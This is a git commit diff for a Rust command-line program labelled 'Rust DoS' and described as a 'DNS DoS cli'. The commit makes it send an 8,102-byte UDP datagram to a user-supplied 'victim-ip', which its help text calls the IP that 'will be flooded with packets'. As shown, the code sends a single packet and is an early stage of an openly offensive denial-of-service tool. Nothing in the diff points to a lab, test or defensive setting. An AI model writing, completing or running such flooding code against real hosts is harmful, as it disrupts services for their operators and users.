f07985d320104910f69326e966d8fde5936f10d4
Frank <frank.mancia@outlook.com>
2022-10-31 21:19:07 -0700

    sends udp packets

--- rust_dos/src/main.rs
+++ rust_dos/src/main.rs
@@ -1,22 +1,25 @@
 use clap::{Arg, ArgAction, Command};
 use std::net::UdpSocket;
+// use std::env;
 
 fn main() -> std::io::Result<()>
 {
+    // env::set_var("RUST_BACKTRACE", "1");
     let matches = Command::new("Rust DoS")
         .about("DNS DoS cli")
         .version("1.0")
         .author("Raaven")
         .disable_help_flag(true)
-        .arg(Arg::new("vicitm-ip")
-            .short('V')
+        .arg(Arg::new("victim-ip")
+            .short('X')
             .long("victim-ip")
             .help("Set the IP that will be flooded with packets.")
             .required(true))
         .arg(Arg::new("host-ip")
             .short('H')
             .long("host-ip")
-            .help("Set the host IP to send packets."))
+            .help("Set the host IP to send packets.")
+            .default_value("0.0.0.0:4444"))
         .arg(Arg::new("help")
             .short('h')
             .long("help")
@@ -24,25 +27,26 @@ fn main() -> std::io::Result<()>
             .action(ArgAction::Help)).get_matches();
 
     {
-        println!("\nVictim-IP: {:?}\nHost-IP: {:?}", matches.get_one::<String>("attack-ip"), matches.get_one::<String>("host-ip"));
+        println!("\nVictim-IP: {:?}\nHost-IP: {:?}", matches.get_one::<String>("victim-ip").unwrap(), matches.get_one::<String>("host-ip").unwrap());
 
         // create socket on self
-        let socket = UdpSocket::bind("127.0.0.1:4444").expect("Couldn't bind to address");
+        let host = matches.get_one::<String>("host-ip").unwrap();
+        let socket = UdpSocket::bind(&host).expect("Couldn't bind to address");
 
         //connect to victim server
-        socket.connect("127.0.0.1:8080").expect("connect function failed");
+        let victim = matches.get_one::<String>("victim-ip").unwrap();
+        socket.connect(&victim).expect("connect function failed");
 
         //send packets to server
-        socket.send(&[0, 1, 2]).expect("couldn't send message");
+        let mut buf = [0u8; 8102];
+        // socket.send(&[0u8; 1500]).expect("couldn't send message"); //requires connect
 
-        // let args = Cli::parse();
+        buf.fill(8);
 
-        //println!("{:?}", &args.pattern);
-        // if &args.pattern == "ip"
-        // {
-        //     println!("The IP({:?}) will be flooded with port 53", &args.pattern);
-        // }
-
+        match socket.send_to(&buf, victim) {
+            Ok(number_of_bytes) => println!("{:?}", number_of_bytes),
+            Err(fail) => println!("failed sending {:?}", fail),
+        }
         // let socket 
     } // socket closes here
 
